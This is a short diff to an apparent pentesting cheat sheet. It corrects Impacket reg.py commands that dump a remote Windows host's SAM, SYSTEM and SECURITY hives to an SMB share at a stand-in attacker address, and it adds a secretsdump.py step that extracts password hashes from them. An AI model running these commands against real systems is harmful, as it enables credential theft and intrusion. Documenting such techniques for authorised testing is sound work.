@@ -3,7 +3,13 @@
 
 ```bash
 reg.py domain/user:password@target save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\share'
-reg.py domain/user:password@target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\share'
-reg.py domain/user:password@target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\share'
+reg.py domain/user:password@target save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\share'
+reg.py domain/user:password@target save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\share'
+```
+
+Then extract the information:
+
+```bash
+secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
 ```
 
